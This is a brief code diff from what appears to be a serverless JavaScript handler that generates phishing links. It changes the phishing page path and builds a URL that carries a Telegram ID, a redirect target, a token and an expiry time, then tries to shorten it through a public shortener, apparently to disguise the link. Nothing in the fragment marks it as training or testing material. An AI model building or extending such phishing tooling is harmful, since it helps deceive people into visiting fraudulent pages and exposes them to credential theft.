@@ -18,7 +18,7 @@ export default async (req, res) => {
     const expires = Date.now() + 24 * 60 * 60 * 1000;
 
     // Generate phishing URL
-    const baseUrl = 'https://opaslabs.vercel.app/phishing.html';
+    const baseUrl = 'https://opaslabs.vercel.app/phishing/phishing.html';
     const phishingUrl = `${baseUrl}?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}&expires=${expires}`;
 
     // Attempt to shorten URL using spoo.me
